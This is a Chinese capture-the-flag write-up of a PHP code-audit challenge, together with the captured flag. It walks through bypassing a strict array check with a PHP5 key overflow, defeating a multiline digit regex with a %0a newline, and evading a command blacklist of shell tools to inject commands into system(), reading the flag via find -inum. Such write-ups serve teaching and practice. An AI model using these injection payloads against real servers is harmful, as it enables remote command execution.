访问页面：

```php
<?php
//php5.5.9
$stuff = $_POST["stuff"];
$array = ['admin', 'user'];
if($stuff === $array && $stuff[0] != 'admin') {
    $num= $_POST["num"];
    if (preg_match("/^\d+$/im",$num)){
        if (!preg_match("/sh|wget|nc|python|php|perl|\?|flag|}|cat|echo|\*|\^|\]|\\\\|'|\"|\|/i",$num)){
            echo "my favorite num is:";
            system("echo ".$num);
        }else{
            echo 'Bonjour!';
        }
    }
} else {
    highlight_file(__FILE__);
}
```

简单的代码审计

- 首先是个判断，既要数组强等于，又要首元素不等
- 然后是个正则，要求整个字符串都是数字，大小写不敏感，跨行检测
- 最后是个黑名单，把常用的都排除了

本题的解题思路是，先绕过前面3个if判断，然后利用system()执行外部命令。

# PHP5 Key溢出

key溢出绕过第一个if，payload(4294967296=2^32)：

```
stuff[4294967296]=admin&stuff[1]=user&num=123   
或者
stuff[-4294967296]=admin&stuff[1]=user&num=123
```

# 换行符%0a绕过跨行匹配

```
stuff[4294967296]=admin&stuff[1]=user&num=123%0als
```

# **用inode索引节点**

```
stuff[4294967296]=admin&stuff[1]=user&num=123%0atac `find /  -inum 30415432 `
```

得到flag：cyberpeace{c9cbfc75ef62027999fa50b3141fb5ae}
